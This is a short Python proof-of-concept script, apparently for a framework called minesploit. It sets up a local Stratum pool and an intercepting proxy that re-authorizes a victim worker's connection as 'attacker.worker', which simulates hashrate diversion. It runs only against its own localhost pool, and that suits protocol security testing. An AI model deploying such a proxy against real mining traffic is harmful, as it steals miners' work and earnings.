#!/usr/bin/env -S minesploit -s
"""Stratum V1 hashrate diversion hypothesis"""

from minesploit.protocols.stratum.client import StratumClient
from minesploit.protocols.stratum.proxy import StratumProxy
from minesploit.protocols.stratum.server import StratumServer

pool = StratumServer(port=3333).start()
proxy = StratumProxy(listen_port=3334, upstream_port=3333, upstream_user="attacker.worker").start()

await asyncio.sleep(0.5)

client = StratumClient(host="127.0.0.1", port=3334, worker_name="victim.worker")
await client.connect()
await client.subscribe()
await client.authorize()

await asyncio.sleep(2)

print(f"Pool stats: {pool.get_stats()}")
print(f"Proxy active: {proxy._running}")

await client.close()
proxy.stop()
pool.stop()
